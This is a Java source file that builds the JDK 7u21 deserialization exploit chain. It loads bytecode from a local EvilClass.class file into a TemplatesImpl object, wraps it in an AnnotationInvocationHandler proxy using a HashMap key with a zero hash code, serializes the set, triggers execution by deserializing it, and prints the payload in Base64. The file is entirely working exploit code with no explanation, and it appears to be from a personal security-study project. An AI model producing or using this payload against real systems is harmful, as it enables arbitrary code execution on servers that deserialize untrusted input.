import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xerces.internal.impl.dv.util.Base64;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class jdk7u21 {
    public static void main(String[] args) throws Exception{

        byte[][] bytes = getExpClassFileBytes();

        TemplatesImpl templates = new TemplatesImpl();
        setValue(templates, "_name", "v");
        setValue(templates, "_bytecodes", bytes);
        setValue(templates, "_tfactory", new TransformerFactoryImpl());

        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, templates);

        Class clazz = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Templates.class, map);

        Object proxyInstance = Proxy.newProxyInstance(map.getClass().getClassLoader(), new Class[]{Map.class}, handler);

//        proxyInstance.equals(templates);

        HashSet set = new HashSet();
        set.add(proxyInstance);
        set.add(templates);

        byte[] serial = toSerial(set);

        ObjectInputStream in = fromSerial(serial);

        in.readObject();

        toSerialStr(set);
    }

    static public void setValue(Object obj, String f, Object v) throws Exception{
        Field field = obj.getClass().getDeclaredField(f);
        field.setAccessible(true);
        field.set(obj, v);
    }

    static public byte[][] getExpClassFileBytes() throws Exception{
        File file = new File("C:\\Users\\Administrator\\Desktop\\Code\\java sec\\myserial\\out\\production\\jdk7u21\\EvilClass.class");
        byte[] bytes = new byte[(int) file.length()];
        FileInputStream fileInputStream = new FileInputStream(file);
        fileInputStream.read(bytes);
        fileInputStream.close();
        return new byte[][]{bytes};
    }

    static public byte[] toSerial(Object obj) throws Exception{
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(byteArrayOutputStream);
        out.writeObject(obj);
        out.flush();
        out.close();
        return byteArrayOutputStream.toByteArray();
    }

    static public ObjectInputStream fromSerial(byte[] bytes) throws Exception{
        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);
        ObjectInputStream in = new ObjectInputStream(byteArrayInputStream);
        return in;
    }

    static public void toSerialStr(Object obj) throws Exception{
        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
        ObjectOutputStream out = new ObjectOutputStream(byteArrayOutputStream);
        out.writeObject(obj);
        out.flush();
        out.close();
        System.out.println(Base64.encode(byteArrayOutputStream.toByteArray()));


    }
}
